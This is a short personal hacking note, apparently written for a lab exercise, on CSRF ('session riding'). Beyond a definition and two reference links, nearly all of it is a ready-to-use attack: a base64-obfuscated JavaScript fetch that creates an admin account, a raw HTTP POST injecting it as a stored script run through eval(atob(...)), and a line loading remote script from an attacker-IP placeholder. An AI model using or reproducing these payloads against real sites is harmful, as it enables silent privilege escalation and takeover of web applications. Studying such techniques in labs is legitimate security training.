---
{"dg-publish":true,"permalink":"/1-hack-like-a-script-kiddie/web/javascript/session-riding-csrf/csrf/","noteIcon":"","created":"2025-04-15T14:11:19.606-04:00"}
---


















https://owasp.org/www-community/attacks/csrf

https://medium.com/@alireubenstone/the-session-ride-of-your-life-1494324db06d


```
CSRF, also known as, “Session Riding”, “…is an attack vector that tricks a web browser into executing an unwanted action in an application to which a user is logged in”.


```

Exploitation -- CSRF to create a new user  
## Create new user  
### Info  
We are dealing with the length limitation in a DB and additional filter on ' , " , \n , and ;  
Payload will be kept to a minimum, and encoded.  
```
Note: #<script src=http://<ATTACKER_IP>/xss.js></script> would allow us to bypass these limitations completely and load  
any arbitrary JS.  
We are using a small unhosted payload isntead to not deal with CORS (if present) and demonstrate additional filter bypass.  
```
The user will be created with a randomized password. Password reset mechanism will have to be subverted.  
### Payload  
```javascript
a = 'fetch("/admin/users/create",{method:"post",headers:{"Content-Type":"application/x-www-form-  
urlencoded"},body:"name=offsec&email=hi@fluff.me&=isAdmin=true&isMod=true"});'  
btoa(a)  

'ZmV0Y2goIi9hZG1pbi91c2Vycy9jcmVhdGUiLHttZXRob2Q6InBvc3QiLGhlYWRlcnM6eyJDb250ZW50LVR5cGUiOiJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQifSxib2R5OiJuYW1lPW9mZnNlYyZlbWFpbD1oaUBmbHVmZi5tZSY9aXNBZG1pbj10cnVlJmlzTW9kPXRydWUifSk7'  
```
Shell (bash)  
```
POST /question HTTP/1.1  
Host: answers  
Content-Length: 290  
Content-Type: application/x-www-form-urlencoded  
title=test&description=#<script>eval(atob(`ZmV0Y2goIi9hZG1pbi91c2Vycy9jcmVhdGUiLHttZXRob2Q6InBvc3QiLGhlYWRlcnM6eyJDb250ZW50LVR5cGUiOiJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQifSxib2R5OiJuYW1lPW9mZnNlYyZlbWFpbD1oaUBmbHVmZi5tZSY9aXNBZG1pbj10cnVlJmlzTW9kPXRydWUifSk7`))</script>&category=3
```